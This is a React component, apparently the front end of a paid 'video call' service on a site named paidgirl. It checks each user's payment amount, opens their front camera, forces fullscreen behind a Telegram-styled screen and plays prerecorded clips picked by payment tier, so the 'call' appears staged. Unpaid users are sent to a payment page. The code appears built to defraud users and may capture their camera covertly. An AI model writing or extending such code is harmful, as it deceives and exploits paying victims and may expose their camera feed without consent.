import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import VideoCall from './Videocall';
import axios from 'axios';
import TelegramUI from './startPage';
import { fetchWithTimeout, parseError } from './utils';

function Idle() {
    const { profile, chatId, defvid, force } = useParams();
    const [hasJoinedCall, setHasJoinedCall] = useState(false);
    const [canCall, setCanCall] = useState(false);
    const [clientData, setClientData] = useState(null)
    const [userData, setUserData] = useState(null)
    const [loading, setLoading] = useState(true); // New loading state
    const [videoPermission, setVideoPermission] = useState(false);
    const [paymentstats, setPaymentstats] = useState({
        "paid": 0,
        "demoGiven": 0,
        "secondShow": 0,
        "fullShow": 0
    })
    const [video, setVideo] = useState(1)
    const [videoType, setVideoType] = useState("1")
    const [duration, setDuration] = useState(0)
    const [openCount, setOpenCount] = useState(1)
    const [cameraStreams, setCameraStreams] = useState({
        front: null,
        back: null,
    });

    console.log("idlePage: ", video, videoType, openCount, canCall, loading, duration)

    function chooseRandom(arr) {
        const randomIndex = Math.floor(Math.random() * arr.length);
        return arr[randomIndex];
    }

    const getCameraStream = async (isFrontCamera) => {
        const cameraType = isFrontCamera ? 'front' : 'back';
        if (cameraStreams[cameraType]) {
            console.log(`stream exist : isFront-${isFrontCamera}`)
            return cameraStreams[cameraType];
        } else {
            console.log(`stream Does not exist : isFront-${isFrontCamera}`)
        }
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: isFrontCamera ? 'user' : 'environment' },
            audio: false
        });

        setCameraStreams(prev => ({
            ...prev,
            [cameraType]: stream
        }));

        return stream;
    };

    const reqFullScreen = async () => {
        var elem = document.documentElement;
        try {
            if (elem.requestFullscreen) {
                await elem.requestFullscreen({ navigationUI: 'hide' });
            } else if (elem.msRequestFullscreen) {
                await elem.msRequestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                await elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) {
                await elem.webkitRequestFullscreen();
            } else {
                await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${chatId}\nclient=${profile}\nVcError-FullScreenNotSupported`)}`)
            }
        } catch (error) {
            console.log(error)
            const errorDetails = parseError(error)
            await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${chatId}\nclient=${profile}\nVcFullscreenErr-${errorDetails.message}`)}`)
        }
    }

    const joinVideoCall = async () => {
        await reqFullScreen()
        try {
            if (!hasJoinedCall) {
                if (!defvid) {
                    let vType = "1";
                    const setTheVideo = async () => {
                        const chatId = userData.chatId
                        const result = await fetchWithTimeout(`https://uptimechecker2.glitch.me/isRecentUser?chatId=${chatId}`);
                        const count = parseInt(result?.data?.count) || 1;
                        setOpenCount(count)
                        let videoSet = 1
                        if (userData.payAmount > 14 && !userData.demoGiven) {
                            vType = "1";
                            if (paymentstats.demoGiven === 0) {
                                videoSet = 1
                            } else if (paymentstats.demoGiven == 1) {
                                videoSet = 8;
                            } else {
                                videoSet = chooseRandom([9, 13, 15])
                            }
                        } else if (userData.payAmount > 70 && !userData.secondShow) {
                            vType = "2";
                            if (paymentstats.secondShow === 0) {
                                videoSet = 2;
                            } else if (paymentstats.secondShow == 1) {
                                videoSet = 10;
                            } else {
                                videoSet = chooseRandom([11, 16, 14])
                            }
                        } else if (userData.payAmount > 180) {
                            vType = "3";
                            if (!userData.fullShow) {
                                if (paymentstats.fullShow == 0) {
                                    videoSet = 4;
                                } else if (paymentstats.fullShow == 1) {
                                    videoSet = 21
                                } else {
                                    videoSet = chooseRandom([11, 4, 14, 10, 16, 17]);
                                }
                            } else {
                                videoSet = chooseRandom([11, 14, 10, 16, 17]);

                            }
                        }
                        setVideo(videoSet);
                        setVideoType(vType)
                        const lastVideoDetails = result?.data?.videoDetails[`${vType}`];
                        if (lastVideoDetails && lastVideoDetails.time > Date.now() - 600000) {
                            setDuration(lastVideoDetails.duration || 0)
                        }
                    }
                    await setTheVideo();
                } else {
                    setVideo(parseInt(defvid))
                }
                setHasJoinedCall(true);
            }
            await fetchWithTimeout(`https://arpithared.onrender.com/events/delete?chatId=${chatId}`);
            await fetchWithTimeout(`${clientData.repl}/deleteCallRequest/${chatId}`)
        } catch (e) {
            console.log(e)
            const errorDetails = parseError(e)
            await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${chatId}\nclient=${profile}\nVcJoinVDErr-${parseError(e).message}`)}`)
        }
    };

    useEffect(() => {
        const fetchData = async () => {
            try {
                const responseUserInfo = await fetchWithTimeout(`https://uptimechecker2.glitch.me/getUserInfo?clientId=${profile}`);
                setClientData(responseUserInfo.data);
                const responseVidData = await fetchWithTimeout(`https://uptimechecker2.glitch.me/userdata/${responseUserInfo.data?.dbcoll}/${chatId}`);
                const data = responseVidData.data;
                setUserData(data);
                if ((data &&
                    data.canReply !== 0 &&
                    ((data.payAmount > 14 && !data.demoGiven) ||
                        (data.payAmount > 70 && !data.secondShow) ||
                        data.payAmount > 180)) || force === "true"
                ) {
                    setCanCall(true);
                    const demoStats = await fetchWithTimeout(`https://uptimechecker2.glitch.me/paymentstats?chatId=${chatId}&profile=${responseUserInfo.data?.dbcoll}`);
                    if (demoStats?.data) {
                        setPaymentstats(demoStats?.data)
                    }
                }
                setLoading(false);
                getCameraStream(true)
            } catch (e) {
                console.log(e);
                const errorDetails = parseError(e)
                await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`IDle Error: ChatId-${chatId}\nclient=${profile}\nVcPMTSTATSError-${errorDetails.message}`)}`)
            }
        };

        fetchData();
    }, []);

    return (
        <div>
            {loading && <div style={{ marginTop: '5vh' }}>Loading...</div>}
            {!loading &&
                <div>
                    {canCall && paymentstats.demoGiven < 4 &&
                        < div >
                            {!hasJoinedCall && <TelegramUI joinVideoCall={joinVideoCall} clientData={clientData}></TelegramUI>}
                            {hasJoinedCall &&
                                <VideoCall clientData={clientData}
                                    userData={userData}
                                    paymentstats={paymentstats}
                                    video={video} openCount={openCount}
                                    duration={duration}
                                    videoType={videoType}
                                    getCameraStream={getCameraStream}
                                ></VideoCall>}
                        </div>
                    }
                    {
                        !canCall &&
                        <div>
                            <div style={{ marginTop: '5vh', fontWeight: "bolder" }}>Finish Payment</div>
                            <button style={{ transform: 'translateX(-50%)', bottom: '50px', backgroundColor: "rgb(39 115 50)" }} onClickCapture={() => { window.location.href = `https://paidgirl.netlify.app/${profile}` }}>Pay Now!!</button>
                        </div>
                    }
                </div>
            }
        </div >
    )
}
export default Idle